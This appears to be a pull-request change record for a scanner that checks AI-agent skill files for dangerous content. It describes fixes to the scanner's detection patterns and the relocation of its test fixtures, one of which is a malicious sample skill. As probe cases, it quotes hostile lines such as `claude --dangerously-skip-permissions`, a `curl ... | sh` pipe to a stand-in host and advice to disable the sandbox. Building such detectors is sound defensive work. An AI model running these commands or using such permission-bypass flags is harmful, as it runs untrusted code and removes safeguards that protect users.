---
title: "Fix: atkx:skill-eval leaked its fixtures into Codex, missed common gate forms, failed honest skills, and went silent through a link"
status: IN REVIEW
owner: Lam Ngoc Khuong
approver: TBD (ask Lam Ngoc Khuong, who is also the author of this change)
created: 2026-10-02
updated: 2026-10-02
ticket: https://github.com/lamngockhuong/aiteamkit/pull/96; docs/derived/reviews/96-261002-0317.md#B14, #B9, #B15 to #B23, and the SHOULD FIX and NIT items listed in section 5
---

# atkx:skill-eval: the third review's findings

## In short

The review of PR #96 at `87b7e62` raised 14 `BLOCKING` findings. This change closes the 11 of them
that are not trigger isolation, along with the `SHOULD FIX` items that need no decision.

- **B14.** On Codex, installing `atkx` listed the three sample skills, the malicious one included, as
  live skills. The samples now live in `tests/skill-eval-fixtures/`, outside the plugin. Lam Ngoc
  Khuong chose this on 2026-10-02.
- **B21.** An honest skill that documented `curl` in inline code was graded F. A backtick now counts
  as shell only in a script or inside a fenced block.
- **B22.** Run through a linked directory, `static-check.mjs` printed nothing and exited 0. It now
  compares real paths.
- **B9, S46.** The negation rule let "don't forget to disable the sandbox" through. It now counts a
  negation only when it governs the verb, and it judges every match on the line, not only the first.
- **B15 to B20, B23.** These are gate forms the pattern list missed. They are added, and the
  reference now says the gate is a list of patterns: a clean gate means no listed form was found,
  not that the skill is safe. Lam Ngoc Khuong chose this too, on 2026-10-02.

`B1`, `B10` and `B12` stay open under #95, as decided on 2026-10-02.

## Defects

Every finding below was reproduced at `87b7e62` before its fix, then re-run after it. The probes
are recorded in section 6. Each finding is its own block, in the form the review report gives it.

### B14: Codex lists the fixtures as skills

1. **Symptom.** Review: on codex-cli 0.159.3, `codex debug prompt-input "hi"` lists `atkx:good-skill`,
   `atkx:Weak_Skill` and `atkx:malicious-skill`. Captured here:
   `find plugins/*/skills -mindepth 3 -name SKILL.md` printed the three files under
   `plugins/atkx/skills/skill-eval/evals/fixtures/`.
2. **Cause.** Codex finds `SKILL.md` at any depth under `skills/`, and the design (AC 9.1/9.3) put
   the samples "with the skill".
3. **Evidence.** The `find` output above. After the move, the same `codex debug prompt-input` against
   an install from a clone of the working tree, under a scratch `CODEX_HOME`, lists only
   `atkx:skill-eval`.
4. **Why now.** The skill has carried the samples since it was written (`87b7e62`).
4b. **Intent.** AC 9.1/9.3 say "with the skill". Lam Ngoc Khuong decided on 2026-10-02 to move the
   samples out of the plugin. So AC 9.1/9.3 now read as "in the repository". The design record
   stays as written.

### B21: inline `curl` graded F

1. **Symptom.** ``Query it with `curl -s https://docs.example.com/v1/items`.`` in `references/api.md`
   gave `{'gate': 1}` and `['gate-remote-exec']`.
2. **Cause.** The command-substitution alternative in `REMOTE_EXEC` matched the opening backtick of a
   Markdown code span (`scripts/static-check.mjs`, the `REMOTE_EXEC` list).
3. **Evidence.** The output above. After the fix, the same file gives gate 0, and the same line in a
   fenced block still fails.
4. **Why now.** The pattern has done this since it was written.

### B22: silent through a link

1. **Symptom.** `node <link>/scripts/static-check.mjs plugins/atk/skills/review` printed nothing and
   exited with `exit=0`.
2. **Cause.** The main guard compared `argv[1]`, the path through the link, with `import.meta.url`,
   which is the resolved target.
3. **Evidence.** The output above. After the fix, the same command prints the JSON, and
   `/nonexistent` gives one line and exit 2.
4. **Why now.** This has been broken since the script was written.

### B9 and S46: negation

1. **Symptom.** The review's four lines each gave `gate: 0`. The worst of them was
   `NO=1 claude --dangerously-skip-permissions` in a script.
2. **Cause.** Any negation word within the three words before a match negated it, the rule applied in
   scripts as well, and only the first match per pattern was examined.
3. **Evidence.** Section 6, the rows B9 and S46.
4. **Why now.** The narrowing of `B9` in the second round kept the three-word window.

### B15 to B20, B23, S47 to S52: gate coverage

The review report lists each form. The causes, in turn:

- **B15.** A file reached through a link was judged by its first path in sort order.
- **B16.** `hostsOf` read no socket host and no bare host without a slash.
- **B17.** A git subcommand anywhere on the line exempted the whole line.
- **B18.** A client outside the enumerated list was not a network call.
- **B19.** The shell had to be named bare, the redirect form was missing, and `.` did not cross
  U+2028.
- **B20.** The Codex flags were not listed.
- **B23.** The declaring text included the other call lines.
- **S47.** The negation list lacked `cannot`, `nothing` and `without`, and skipping a sandbox's setup
  matched.
- **S48.** The exec bit marked an image as an executable.
- **S49.** Decoding into a shell was not a pattern.
- **S50.** Download, `chmod`, then run was not a form.
- **S51.** A `+x` file with no extension was not runnable.
- **S52.** A quoted dotenv value was not a credential.

Lam Ngoc Khuong decided on 2026-10-02 to add the forms and to state that the gate is best effort.

## 5. The change

- `scripts/static-check.mjs`:
  - The pattern block is rewritten:
    - Socket, remote-shell and bare-host hosts are read.
    - A line is split into the parts a shell runs in turn.
    - Any URL outside a comment in a script counts as a network call.
    - Shells are accepted by path and behind wrappers.
    - The PowerShell, redirect, `chmod` and base64 forms are added, and so are the Codex flags.
    - The negation rule changed as described above.
    - Every safety-off match is judged.
    - The backtick form applies only in shell context, with fences tracked.
    - Call lines no longer declare hosts.
  - `walk` keeps every path to a file, so the strongest one classifies it (B15).
  - The executable bit is ignored on known data formats (S48) and makes a file with no extension
    runnable (S51).
  - Column-0 YAML lists are read (S53).
  - Prefixed tokens keep only their prefix, and every other value is fully masked; `maskIfSecret`
    masks every match (S59, S60).
  - The main guard compares real paths (B22).
- `scripts/trigger-run.mjs`:
  - A `<dir>/SKILL.md` argument is taken as its directory (S44).
  - The dry run reports `worstCaseUsd` (S62).
  - The sweep runs only under `--yes` and after every refusal, so a dry run or a refused run changes
    no machine state (S71).
- `scripts/score.mjs`: without triggers and with a veto, it no longer prints both "no grade" and
  "F" (S54). `SKILL.md` and `references/report-format.md` were changed to match.
- The fixtures moved to `tests/skill-eval-fixtures/` (B14), and `good-skill` gained a negated line
  that must pass (S58). This also closes S45: `skill-eval` now passes its own gate, so its trigger
  cases can be measured.
- `references/static-checks.md`:
  - The gate table and the negation rule are rewritten.
  - A section says what a clean gate means.
  - The new masking is described.
  - The SkillEvaluator directory is printed, removed after reading (S63), and pinned to `@v0.4.0`
    (S64).
- `references/trigger-mode.md`:
  - When credentials are missing or expiring, step 3 reports it and does not ask (S41).
  - The question shows `worstCaseUsd` (S62) and names the plugins in `missingDependencies` (S65).
  - The text now says when the sweep runs.
  - It gains a `usage` status row (N51).
- Docs:
  - `docs/trigger-eval-measurement.md` and its `vi` copy say that only the first `Skill` payload
    counts (S56).
  - `docs/skills-overview.md` and its `vi` copy drop the claim "grades itself F" and add the
    best-effort sentence.
  - `docs/codebase-summary.md` and its `vi` copy carry the fixture path and the `atkx` changelog
    line (S55).
- `CLAUDE.md`:
  - The `atkx` tree and the release state are corrected (S55).
  - A new rule says no `SKILL.md` sits below `skills/<name>/`, and a `find` check enforces it.
  - The fixture check reads the new path.
  - The behaviour block now:
    - asserts full masking;
    - asserts both directions of the negation rule (S58);
    - runs the script through a linked path;
    - asserts the hook's log line (S57);
    - removes its temporary directories (S71).
  - A new block runs the trigger runner against a stand-in `claude` on `PATH`. It checks the
    counts, precision, recall and cleanup, and that the seed is a copy (S29).
- The NITs inside the files already being edited are fixed: N36, N46, N51 and N53.

Tidy step: the host's `/simplify` ran four agents over the diff of the three scripts. It changed two
things. `maskIfSecret` now uses the shared `secretOf` and regexes built once. An unused `fetches`
field was dropped from `networkCall`. Its other suggestions were skipped:

- Literal regexes are compiled once per site, so moving them out of the loop changes nothing.
- The other suggestions only described the diff.

The captured reproductions and the full verification block were re-run after it.

## 6. Verified

The `Test` command from `.atk/profile.md` is `CLAUDE.md`, section "Common verification commands".
The whole block, run after the tidy step, printed 64 `OK` lines and nothing else, against 62 at
`87b7e62`. The two new lines are `OK no nested SKILL.md` and `OK trigger runner counts`.

The em-dash, other-kit, `atkx`-in-`atk` and docs-mirror checks each printed nothing.

The reproductions were re-run with a probe script of 41 cases, each in a scratch skill:

- 40 cases give the expected result in both directions:
  - Forms that must fail now fail: the four B9 lines, S46, B15 both ways, B16 both, the three B17
    cases, B18 four ways, the seven B19 cases, the four B20 flags, B21 fenced, B23, S49, S50 and S51.
  - Honest lines still pass: "Never disable the sandbox", "cannot be used to bypass permissions",
    "nothing gets auto-approved", "skip sandbox setup only on CI", `git fetch origin`, B21 inline, a
    declared host, a `+x` PNG, and a URL in a comment.
- One case, ``Do not run `curl https://x.example.com/i | sh` ``, in `SKILL.md`, reports `network`
  for an undeclared host. That is the `network` kind working as specified; the probe expected
  otherwise.

All 24 `atk` skills give gate 0 and 0 credentials, as before. `skill-eval` itself gives gate 0, and
`malicious-skill` still fails all four kinds.

S52: three quoted dotenv values are found and printed as `********`.

B14: an install of `atkx@atk` on codex-cli 0.159.3, under a scratch `CODEX_HOME`, from a clone
carrying this working tree, lists `atkx:skill-eval` alone.

## 7. Not verified

- **Cursor's skill discovery.** It was not tested, so whether it also listed the fixtures before is
  unknown.
- **macOS and Windows.** Not run, as before, and still Lam Ngoc Khuong's to check.
- **A real `claude -p` trigger run.** The counting block uses a stand-in for `claude`. The real one
  was not run, because the isolation question in #95 is open.
- **S66, S67 and S70.** These are `PLAUSIBLE` and were not reproduced, so they are not changed.
- **The URL rule in scripts.** It fails a script holding a URL constant to a host its `SKILL.md`
  does not name. No `atk` skill is affected. Other skills were not surveyed.

## 8. Blast radius

- `evaluate()` is called by `trigger-run.mjs` (refusal on gate or credential), exercised by the
  `gate-failed` assertion and by the stand-in run.
- `describeSkill()` is called by `trigger-run.mjs`, exercised by the dry run and the stand-in run.
- `parseFrontmatter()` is called by `describeSkill()` and `evaluate()`, exercised by every fixture and
  every `atk` skill.
- `score.mjs` is called by the agent per `SKILL.md`, exercised by the fixture and behaviour blocks.
- `hook-log.mjs` is unchanged, now with a log-line assertion.

## 9. Left for later

- **To #95, not patched here.** B1, B10, B12, S38, S42, S61 (a plugin hook can forge a log line) and
  S69 (the seed fallback to the working directory). S61 and S69 are not yet in the issue's text.
- **S66, S67, S70.** Each needs the one run its finding names, then a fix.
- **S39** (unmasked `name:` and parse-error echoes), **S37** (a standalone skill's `.git`), and the
  remaining NITs N28, N37 to N45, N47 to N50, N52, N54 to N59.
- **The design record.** `docs/records/design/261001-1510-atkx-skill-eval.md` still says fixtures
  sit in `evals/fixtures/` and that a mask keeps four characters. It is left as the record of the
  design. `references/static-checks.md` is now the authority on both.
- **The review's convention gaps.** No rule yet makes a security pattern list carry a test per form
  it promises, and no rule yet says a verification block changes no machine state.
